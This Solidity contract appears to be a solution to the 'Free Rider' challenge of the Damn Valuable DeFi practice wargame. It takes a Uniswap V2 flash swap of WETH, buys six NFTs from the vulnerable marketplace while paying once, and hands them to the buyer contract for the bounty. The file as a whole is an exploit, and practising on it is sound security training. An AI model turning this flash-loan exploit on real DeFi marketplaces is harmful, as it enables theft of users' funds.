// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;
import "../DamnValuableToken.sol";
import "../DamnValuableNFT.sol";
import "../WETH9.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "hardhat/console.sol";
interface IUniswapV2Callee {
    function uniswapV2Call (
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

contract FreeRiderHacker is IUniswapV2Callee, IERC721Receiver {
    DamnValuableToken private immutable DVT;
    DamnValuableNFT private immutable NFT;
    FreeRiderNFTMarketplace private immutable MARKETPLACE;
    FreeRiderBuyer private immutable BUYER;
    WETH9 private immutable WETH;
    IUniswapV2Factory private immutable FACTORY;
    IUniswapV2Pair private immutable PAIR;
    address private immutable OWNER = msg.sender;
    using Address for address;
    

    constructor(address _token, address _weth, address _factory, address _nft, address _buyer, address _marketplace) {
        DVT = DamnValuableToken(_token);
        WETH = WETH9(payable(_weth));
        FACTORY = IUniswapV2Factory(_factory);
        NFT = DamnValuableNFT(_nft);
        MARKETPLACE = FreeRiderNFTMarketplace(payable(_marketplace));
        BUYER = FreeRiderBuyer(_buyer);
        PAIR = IUniswapV2Pair(FACTORY.getPair(address(DVT), address(WETH)));
    }

    function hack(uint borrowAmount) external {
        flashSwap(borrowAmount);
    }

    function flashSwap(uint borrowAmount) private {
        bytes memory data = abi.encode(WETH, OWNER);
        PAIR.swap(borrowAmount, 0, address(this), data);
    }

    function uniswapV2Call(address _sender,
        uint _amount0,
        uint _amount1,
        bytes calldata _data) external override{
        require(msg.sender == address(PAIR), "wrong caller");

        (address tokenBorrow,) = abi.decode(_data, (address, address));
        require(tokenBorrow == address(WETH), "token borrow != WETH");
        
        // about 0.3% fee, +1 to round up
        uint fee = (_amount0 * 3) / 997 + 1;
        uint amountToRepay = _amount0 + fee;
        WETH.withdraw(15e18);
        buyNfts();
        transferNftsToTheBuyer();
        WETH.deposit{value:90e18}();
        // Transfer flash swap fee from caller
        WETH.transferFrom(OWNER, address(this), fee);
        WETH.transfer(address(PAIR), amountToRepay);
        }

    function withdrawFunds() external {
        require(msg.sender == OWNER, "not authorized");
        uint256 balance = WETH.balanceOf(address(this));
        WETH.transfer(OWNER, balance);
    }

    function buyNfts() private{
        uint[] memory tokenIds = new uint[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;
        MARKETPLACE.buyMany{value: 15e18}(tokenIds);
    }

    function transferNftsToTheBuyer() private {
        for (uint i; i < 6; ++i) {
            NFT.safeTransferFrom(address(this), address(BUYER), i);
        }
    }
    receive() external payable {}

   function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}